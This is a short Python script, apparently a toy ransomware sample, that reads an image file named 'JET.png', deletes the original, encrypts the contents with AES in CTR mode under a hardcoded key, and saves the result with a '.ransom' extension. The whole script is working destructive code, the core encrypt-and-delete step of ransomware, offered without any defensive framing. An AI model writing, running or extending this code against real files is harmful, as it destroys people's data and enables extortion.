import os
import pyaes

file_name = "JET.png"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = "123456789peste12"
aes = pyaes.AESModeOfOperationCTR(key.encode())
crypto_data = aes.encrypt(file_data)

new_file_name = file_name + ".ransom"
new_file = open(new_file_name, "wb")
new_file.write(crypto_data)
new_file.close()